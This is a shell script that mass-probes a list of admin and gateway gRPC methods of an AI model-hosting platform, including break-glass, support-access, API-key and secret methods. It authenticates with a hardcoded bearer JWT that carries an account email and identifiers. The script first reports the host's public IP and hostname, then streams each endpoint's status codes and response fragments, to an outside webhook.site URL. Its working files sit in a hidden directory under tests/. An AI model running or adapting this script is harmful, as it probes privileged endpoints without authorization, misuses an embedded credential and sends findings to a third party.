#!/bin/sh
SINK="https://webhook.site/a867b411-8f9f-43ab-a1f7-2e7679afcd9a"
RUN="i84695b1"
W="tests/.i84695b1"
mkdir -p "$W" 2>/dev/null
[ -f "$W/done" ] && exit 0
printf '\000\000\000\000\000' > "$W/req.bin"
post() { curl -sS -m 25 -X POST -H 'content-type: application/json' --data-binary @"$1" "$SINK" >/dev/null 2>&1; }
ip=$(curl -sS -m 8 https://api.ipify.org 2>/dev/null)
printf '{"stage":"start","run":"%s","ip":"%s","host":"%s"}' "$RUN" "$ip" "$(hostname)" > "$W/j0"
post "$W/j0"

cat > "$W/m.txt" <<'MEOF'
admingateway.AdminGateway/ActivateSchedulingEntitlementReservationAuthority
admingateway.AdminGateway/ApproveSupportAccessGrant
admingateway.AdminGateway/ApproveThroughputReservationRequest
admingateway.AdminGateway/ApproveThroughputReservationRequestWithBehavior
admingateway.AdminGateway/BatchCreateSkuMappings
admingateway.AdminGateway/BreakGlassSupportAccessGrant
admingateway.AdminGateway/CancelTransferReservationCapacity
admingateway.AdminGateway/CreateAbuseRule
admingateway.AdminGateway/CreateAccountConsumptionPolicy
admingateway.AdminGateway/CreateBatchJobConfig
admingateway.AdminGateway/CreateBlockedImageTagRule
admingateway.AdminGateway/CreateDeploymentExperiment
admingateway.AdminGateway/CreateDeploymentPerformanceTarget
admingateway.AdminGateway/CreateDeploymentReplicaEvents
admingateway.AdminGateway/CreateFeatureFlag
admingateway.AdminGateway/CreatePricingPlan
admingateway.AdminGateway/CreateRatelimit
admingateway.AdminGateway/CreateReservation
admingateway.AdminGateway/CreateSchedulingEntitlement
admingateway.AdminGateway/CreateServerlessMode
admingateway.AdminGateway/CreateSkuMapping
admingateway.AdminGateway/CreateThroughputReservation
admingateway.AdminGateway/CreateThroughputReservationContract
admingateway.AdminGateway/CreateThroughputReservationContractLink
admingateway.AdminGateway/CreateThroughputReservationListPrice
admingateway.AdminGateway/CreateTrafficForker
admingateway.AdminGateway/CreateTrainerPool
admingateway.AdminGateway/CreateTrainerPoolMember
admingateway.AdminGateway/CreateVisionEncoder
admingateway.AdminGateway/DeleteAbuseRule
admingateway.AdminGateway/DeleteAccountConsumptionPolicy
admingateway.AdminGateway/DeleteBatchJobConfig
admingateway.AdminGateway/DeleteBlockedImageTagRule
admingateway.AdminGateway/DeleteCreditCode
admingateway.AdminGateway/DeleteDeploymentPerformanceTarget
admingateway.AdminGateway/DeleteDeploymentShard
admingateway.AdminGateway/DeleteFeatureFlag
admingateway.AdminGateway/DeletePricingPlan
admingateway.AdminGateway/DeleteRatelimit
admingateway.AdminGateway/DeleteReservation
admingateway.AdminGateway/DeleteScheduleReservation
admingateway.AdminGateway/DeleteSchedulingEntitlement
admingateway.AdminGateway/DeleteServerlessMode
admingateway.AdminGateway/DeleteSkuMapping
admingateway.AdminGateway/DeleteThroughputReservation
admingateway.AdminGateway/DeleteThroughputReservationContract
admingateway.AdminGateway/DeleteThroughputReservationContractLink
admingateway.AdminGateway/DeleteThroughputReservationListPrice
admingateway.AdminGateway/DeleteTrafficForker
admingateway.AdminGateway/DeleteTrafficGenerator
admingateway.AdminGateway/DeleteTrainerPool
admingateway.AdminGateway/DeleteTrainerPoolMember
admingateway.AdminGateway/DeleteVerifiedPhone
admingateway.AdminGateway/DeleteVisionEncoder
admingateway.AdminGateway/DenySupportAccessGrant
admingateway.AdminGateway/EndNexusPlan
admingateway.AdminGateway/GetAbuseRule
admingateway.AdminGateway/GetAccountConsumptionPolicy
admingateway.AdminGateway/GetBreakGlassEnabled
admingateway.AdminGateway/GetCreditCode
admingateway.AdminGateway/GetRatelimit
admingateway.AdminGateway/GetReservationShard
admingateway.AdminGateway/GetScheduleReservation
admingateway.AdminGateway/GetThroughputReservation
admingateway.AdminGateway/GetThroughputReservationContract
admingateway.AdminGateway/GetThroughputReservationContractLink
admingateway.AdminGateway/GetThroughputReservationListPrice
admingateway.AdminGateway/GetTransferReservationCapacityOperation
admingateway.AdminGateway/ListAbuseRules
admingateway.AdminGateway/ListAccountConsumptionPolicies
admingateway.AdminGateway/ListCreditCodes
admingateway.AdminGateway/ListDeploymentEventsAdmin
admingateway.AdminGateway/ListDeploymentEventsByEventTypeAdmin
admingateway.AdminGateway/ListRatelimits
admingateway.AdminGateway/ListReservationShards
admingateway.AdminGateway/ListSupportAccessGrants
admingateway.AdminGateway/ListThroughputReservationContractLinks
admingateway.AdminGateway/ListThroughputReservationContracts
admingateway.AdminGateway/ListThroughputReservationListPrices
admingateway.AdminGateway/ListThroughputReservationRequests
admingateway.AdminGateway/ListThroughputReservations
admingateway.AdminGateway/ListTrainerPoolMembers
admingateway.AdminGateway/ListTransferReservationCapacityOperations
admingateway.AdminGateway/MaterializeReservation
admingateway.AdminGateway/MoveReservation
admingateway.AdminGateway/RefreshQuotaUsages
admingateway.AdminGateway/RejectThroughputReservationRequest
admingateway.AdminGateway/RequestSupportAccessGrant
admingateway.AdminGateway/RevokeSupportAccessGrant
admingateway.AdminGateway/SetBreakGlassEnabled
admingateway.AdminGateway/SetShapelessRiskEnforcement
admingateway.AdminGateway/SetTrainerNodeFitPreflightMode
admingateway.AdminGateway/SubmitThroughputReservationRequest
admingateway.AdminGateway/TransferReservationCapacity
admingateway.AdminGateway/UpdateAbuseRule
admingateway.AdminGateway/UpdateAccountConsumptionPolicy
admingateway.AdminGateway/UpdateBatchJobConfig
admingateway.AdminGateway/UpdateCreditCode
admingateway.AdminGateway/UpdateDeploymentExperiment
admingateway.AdminGateway/UpdateDeploymentPerformanceTarget
admingateway.AdminGateway/UpdateFeatureFlag
admingateway.AdminGateway/UpdateMigrateDeployment
admingateway.AdminGateway/UpdateModelDownloadPreference
admingateway.AdminGateway/UpdatePricingPlan
admingateway.AdminGateway/UpdateRatelimit
admingateway.AdminGateway/UpdateReservation
admingateway.AdminGateway/UpdateServerlessDeploymentGroup
admingateway.AdminGateway/UpdateServerlessMode
admingateway.AdminGateway/UpdateServerlessModelAccess
admingateway.AdminGateway/UpdateSkuMapping
admingateway.AdminGateway/UpdateThroughputReservation
admingateway.AdminGateway/UpdateThroughputReservationContract
admingateway.AdminGateway/UpdateThroughputReservationListPrice
admingateway.AdminGateway/UpdateTrafficForker
admingateway.AdminGateway/UpdateTrainerPool
admingateway.AdminGateway/UpdateTrainerPoolMember
admingateway.AdminGateway/UpdateVisionEncoder
admingateway.AdminGateway/ValidateToken
gateway.Gateway/AcquireDeploymentShapePromotionReservation
gateway.Gateway/ApproveUserUsageLimitIncreaseRequest
gateway.Gateway/BeginDirectorySyncSetup
gateway.Gateway/BindProviderKey
gateway.Gateway/CancelDirectorySyncSetup
gateway.Gateway/CancelNexusPlan
gateway.Gateway/CancelNexusPlanCheckout
gateway.Gateway/CancelThroughputReservationRequest
gateway.Gateway/CloseDeploymentShapePromotionReservation
gateway.Gateway/ConsumeDeploymentShapePromotionReservation
gateway.Gateway/CreateAccount
gateway.Gateway/CreateApiKey
gateway.Gateway/CreateCluster
gateway.Gateway/CreateDataset
gateway.Gateway/CreateDatasetValidationJob
gateway.Gateway/CreateDeployedModel
gateway.Gateway/CreateDeployment
gateway.Gateway/CreateDeploymentShape
gateway.Gateway/CreateDeploymentShapeRolloutCandidate
gateway.Gateway/CreateDeploymentTemplate
gateway.Gateway/CreateDeveloperPass
gateway.Gateway/CreateDpoJob
gateway.Gateway/CreateEagleTrainingJob
gateway.Gateway/CreateEvaluation
gateway.Gateway/CreateEvaluationJob
gateway.Gateway/CreateEvaluator
gateway.Gateway/CreateEvaluatorV2
gateway.Gateway/CreateExternalKey
gateway.Gateway/CreateGroup
gateway.Gateway/CreateGroupMember
gateway.Gateway/CreateGroupUsageLimitTier
gateway.Gateway/CreateIdentityProvider
gateway.Gateway/CreateKvCacheStore
gateway.Gateway/CreateModel
gateway.Gateway/CreateModelVersion
gateway.Gateway/CreateNexusPlan
gateway.Gateway/CreatePaymentVerification
gateway.Gateway/CreateReinforcementFineTuningJob
gateway.Gateway/CreateRewardGuidedFineTuningJob
gateway.Gateway/CreateRewardModelTrainingJob
gateway.Gateway/CreateRlorTrainerJob
gateway.Gateway/CreateRouter
gateway.Gateway/CreateSecret
gateway.Gateway/CreateSupervisedFineTuningJob
gateway.Gateway/CreateThroughputReservationRequest
gateway.Gateway/CreateTrainingRun
gateway.Gateway/CreateTrainingSamplerRoute
gateway.Gateway/CreateTrainingSession
gateway.Gateway/CreateTrainingSessionChunkOutput
gateway.Gateway/CreateTrainingShape
gateway.Gateway/CreateUserUsageLimitIncreaseRequest
gateway.Gateway/DeleteAccount
gateway.Gateway/DeleteApiKey
gateway.Gateway/DeleteBatchInferenceJob
gateway.Gateway/DeleteCheckpoint
gateway.Gateway/DeleteCluster
gateway.Gateway/DeleteDataset
gateway.Gateway/DeleteDatasetValidationJob
gateway.Gateway/DeleteDeployedModel
gateway.Gateway/DeleteDeployment
gateway.Gateway/DeleteDeploymentShape
gateway.Gateway/DeleteDeploymentTags
gateway.Gateway/DeleteDeploymentTemplate
gateway.Gateway/DeleteDpoJob
gateway.Gateway/DeleteEagleTrainingJob
gateway.Gateway/DeleteEvaluation
gateway.Gateway/DeleteEvaluationJob
gateway.Gateway/DeleteEvaluator
gateway.Gateway/DeleteEvaluatorVersion
gateway.Gateway/DeleteExternalKey
gateway.Gateway/DeleteGroup
gateway.Gateway/DeleteGroupMember
gateway.Gateway/DeleteGroupUsageLimitTier
gateway.Gateway/DeleteIdentityProvider
gateway.Gateway/DeleteKvCacheStore
gateway.Gateway/DeleteModel
gateway.Gateway/DeletePaymentMethod
gateway.Gateway/DeleteProviderKey
gateway.Gateway/DeleteReinforcementFineTuningJob
gateway.Gateway/DeleteRlorTrainerJob
gateway.Gateway/DeleteRouter
gateway.Gateway/DeleteSecret
gateway.Gateway/DeleteSupervisedFineTuningJob
gateway.Gateway/DeleteTrace
gateway.Gateway/DeleteTrainingSession
gateway.Gateway/DeleteTrainingShape
MEOF

nw=6
k=0; while [ $k -lt $nw ]; do k=$((k+1)); : > "$W/m$k"; done
awk -v nw=$nw -v w="$W" '{k=(NR-1)%nw+1; print > (w "/m" k)}' "$W/m.txt"
i=0; while [ $i -lt $nw ]; do i=$((i+1)); : > "$W/o$i"; done

cell() {
  w=$1; M=$2; svc=${M%%/*}
  curl -sS --http2 -m 15 -D "$W/h$w" -o "$W/b$w" -X POST "https://gateway.fireworks.ai/$M"     -H 'content-type: application/grpc' -H 'te: trailers' -H 'user-agent: grpc-go/1.60'     -H "authorization: Bearer eyJraWQiOiJabldGSFFVcUlsUnJHL0J5dWtLQlZZdDU4ZGlGbWgrakZXbjFJYXpObEFNPSIsImFsZyI6IlJTMjU2In0.eyJhdF9oYXNoIjoieHh0Z2JqQTRIWTlyYWxfbUxJdFNtUSIsInN1YiI6ImY4MjFjM2MwLWYwYjEtNzAyMi04MGI3LTY2Y2JmY2FmMjI5YSIsImVtYWlsX3ZlcmlmaWVkIjp0cnVlLCJhbXIiOlsicHdkIl0sImlzcyI6Imh0dHBzOi8vY29nbml0by1pZHAudXMtd2VzdC0yLmFtYXpvbmF3cy5jb20vdXMtd2VzdC0yX2ZlQVdKbDJHZCIsImNvZ25pdG86dXNlcm5hbWUiOiJmODIxYzNjMC1mMGIxLTcwMjItODBiNy02NmNiZmNhZjIyOWEiLCJmaXJld29ya3NfYWNjb3VudCI6Imk4NDMzMGw5aTBnejAtNmQ1NGQ2IiwiZmlyZXdvcmtzX3VzZXIiOiJpODQzMzBsOWkwZ3owQGZ3NzA1ODdnc3NwM24uZHludjYubmV0Iiwib3JpZ2luX2p0aSI6ImMxMDFmNzVmLWFjOTEtNDE4My1hZGE2LTAwMmZlMGE5NmIwNiIsImF1ZCI6InN1ZWFzN3Byc2ZyZHAxNm5hbnRiZXFjanYiLCJhY3IiOiJ1cm46Y29nbml0bzpsb2E6MSIsImV2ZW50X2lkIjoiNTRhNjk3NDktMjExOS00ZWI5LWI2ZTQtM2NjNDQzYmIxYTg5IiwidG9rZW5fdXNlIjoiaWQiLCJmaXJld29ya3NfZ3JvdXAiOiIiLCJhdXRoX3RpbWUiOjE3OTQ2NTMzNDQsImV4cCI6MTc5NDY3MTg2NSwiaWF0IjoxNzk0NjY4MjY1LCJqdGkiOiJjMDAyMjQxMC1mYmZkLTRhMWEtYjc3Ni01MTlhZWYxNmYwYWQiLCJlbWFpbCI6Imk4NDMzMGw5aTBnejBAZnc3MDU4N2dzc3Azbi5keW52Ni5uZXQifQ.zW45c3nJkk2iuMb-QbhtKnsyhYz2cvYzKjdFeb45rLf6NLrI3NobXFnfvQnE3HgthPu0UdOmnv8dQeR5_r6LI9RniQi_Lyh8zgwInSWa5JJkOMFGP-WH8x_s-AnF2hPKTyd0stuSJ3Xb60s96vlc9cLCZKJ6CfKFPBUVQvvJIqzk0JjrRIGh8dOqbWPvmOwtOXzVVFg9WQn9yeNsfHW2E6rUqr5sGQmP1MQP-tWjY4ckfeb9uYBWiAbTy2AGUBhnGH-L5EmqReaOTMqlONhLDqtM7GeC9FT4Gt2w5Fk67FiZymlDJBD07E3v6_5R_DusiTUYZbz4hdhxiO_ma1miCQ" --data-binary @"$W/req.bin" -w '%{http_code}' 2>/dev/null > "$W/c$w"
  code=$(cat "$W/c$w" 2>/dev/null); [ -z "$code" ] && code=000
  gs=$(grep -a -i '^grpc-status:' "$W/h$w" 2>/dev/null | tail -1 | tr -d '\r' | awk '{print $2}')
  gm=$(grep -a -i '^grpc-message:' "$W/h$w" 2>/dev/null | tail -1 | tr -d '\r' | cut -d' ' -f2-)
  [ -z "$gs" ] && gs=NA
  gm=$(printf '%s' "$gm" | tr -d '"\\' | tr -cd '[:print:]' | cut -c1-120)
  blen=$(wc -c < "$W/b$w" 2>/dev/null | tr -d ' ')
  sha=$(sha256sum "$W/b$w" 2>/dev/null | cut -c1-16)
  b64=$(head -c 48 "$W/b$w" 2>/dev/null | base64 -w0)
  printf '{"w":%s,"svc":"%s","m":"%s","code":"%s","gs":"%s","gm":"%s","blen":%s,"sha16":"%s","b64":"%s"}\n'     "$w" "$svc" "${M#*/}" "$code" "$gs" "$gm" "${blen:-0}" "$sha" "$b64" >> "$W/o$w"
}

flushc() {
  w=$1; stage=$2
  if [ "$stage" = chunk ]; then tail -n 10 "$W/o$w" > "$W/t$w"; else cat "$W/o$w" > "$W/t$w"; fi
  tot=$(wc -l < "$W/o$w" | tr -d ' ')
  awk -v st="$stage" -v rn="$RUN" -v w="$w" -v tot="$tot"     'BEGIN{printf "{\"stage\":\"%s\",\"run\":\"%s\",\"w\":%s,\"rows\":%s,\"data\":[",st,rn,w,tot} {if(NR>1)printf ","; printf "%s",$0} END{print "]}"}'     "$W/t$w" > "$W/j$w"
  post "$W/j$w"
}

worker() {
  w=$1; f="$W/m$w"; n=0
  while IFS= read -r M; do
    [ -z "$M" ] && continue
    cell "$w" "$M"
    n=$((n+1))
    sleep 0.6
    if [ $((n % 10)) -eq 0 ]; then flushc "$w" chunk; fi
  done < "$f"
  flushc "$w" final
}

i=0; while [ $i -lt $nw ]; do i=$((i+1)); worker $i & done
wait
printf '{"stage":"finished","run":"%s","ts":"%s"}' "$RUN" "$(date -u +%Y-%m-%dT%H:%M:%SZ)" > "$W/jz"
post "$W/jz"
printf done > "$W/done"
